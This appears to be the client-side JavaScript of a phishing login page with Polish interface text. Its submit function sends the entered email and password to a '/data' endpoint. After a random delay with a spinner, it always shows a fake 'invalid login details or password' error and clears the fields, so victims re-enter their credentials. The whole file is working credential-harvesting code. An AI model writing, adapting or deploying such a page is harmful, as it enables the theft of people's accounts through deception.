function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function spin(ms) {
    
}

function submit() {
    let emaildiv = document.getElementById("inp1");
    let passworddiv = document.getElementById("inp2");

    let email = emaildiv.value;
    let password = passworddiv.value;

    let xhr = new XMLHttpRequest();
    xhr.open("POST", "/data");
    xhr.setRequestHeader("Accept", "application/json");
    xhr.setRequestHeader("Content-Type", "application/json");

    let data = `{
        "email": "${email}",
        "password": "${password}"
    }`;

    xhr.send(data);


    let spinner = document.getElementById("spinner");
    let btntext = document.getElementById("btntext");
    if (btntext.className != "") {
        return;
    }
    btntext.className = "hidden";
    spinner.className = "spinner";
    let num = Math.abs(Math.random()) * 3 + 2;
    sleep(num * 1000).then(() => {
        btntext.className = "";
        spinner.className += " hidden";
        let display1 = document.getElementById("email");
        let display2 = document.getElementById("password");
    
        display1.textContent = "ADRES E-MAIL LUB NUMER TELEFONU - Dane logowania lub hasło są nieprawidłowe.";
        display2.textContent = "HASŁO - Dane logowania lub hasło są nieprawidłowe.";
    
        let inpbox = document.getElementById("inpbox");
        inpbox.style.top = "190px";
    
        let button = document.getElementById("submit");
        button.style.top = "320px";
    
        let box = document.getElementById("box");
        box.style.height = "420px";
    
        display1.className = "inpdisplay declined";
        display2.className = "inpdisplay declined";

        emaildiv.value = "";
        passworddiv.value = "";
    })
}